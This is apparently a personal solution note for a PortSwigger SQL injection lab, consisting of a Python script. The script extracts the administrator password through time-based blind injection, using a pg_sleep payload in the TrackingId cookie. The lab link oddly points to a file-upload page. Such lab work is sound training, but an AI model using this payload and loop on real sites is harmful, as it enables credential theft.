
#portswigger #solution #sqli 

- **Category:** [[SQL injection]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
- **Date Solved:** 2026-08-11

```python
import requests
from concurrent.futures import ThreadPoolExecutor

cookies = {
    'TrackingId': 'FwOJoHmS4GFs8mPA',
    'session': '4rAX5y6lkMIwnL9w7roPSiCJQUCwD1Tv',
}

headers = {
    'Host': '0af10020036ff0398028359c00a30094.web-security-academy.net',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="150"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=0, i',
    # 'Cookie': 'TrackingId=FwOJoHmS4GFs8mPA; session=4rAX5y6lkMIwnL9w7roPSiCJQUCwD1Tv',
}



with open("char2.txt", "r") as file:
    word_list = list(map(str.strip, file.readlines()))
n = len(word_list)

# index la vi tri cua ki tu dang can tim 0->19 (20 ki tu)
pwd = [""]*20
def check_and_insert(index):
    # dung binary search
    left = 0
    right = n-1
    local_cookies = cookies.copy()
    while(left < right):
        mid = (left + right)//2
        local_cookies['TrackingId'] = f"qU2JYeDTinLypZLb%27%3BSELECT CASE WHEN (SUBSTRING( (SELECT password FROM users WHERE username='administrator') ,{index+1},1) > '{word_list[mid]}') THEN pg_sleep(6) ELSE pg_sleep(0) END --"
        response = requests.get(
            'https://0af10020036ff0398028359c00a30094.web-security-academy.net/',
            cookies=local_cookies,
            headers=headers,
        )
        execution_time = response.elapsed.total_seconds()
        threshold = 5.5
        if(execution_time>threshold):
            left = mid + 1
        else:
            right = mid
    pwd[index] = word_list[left]


with ThreadPoolExecutor(max_workers = 4) as executor:
    [executor.submit(check_and_insert,i) for i in range(20)]


print("THIS IS THE PASSWORD: ", "".join(pwd))
```

![[Pasted image 20260811164609.png]]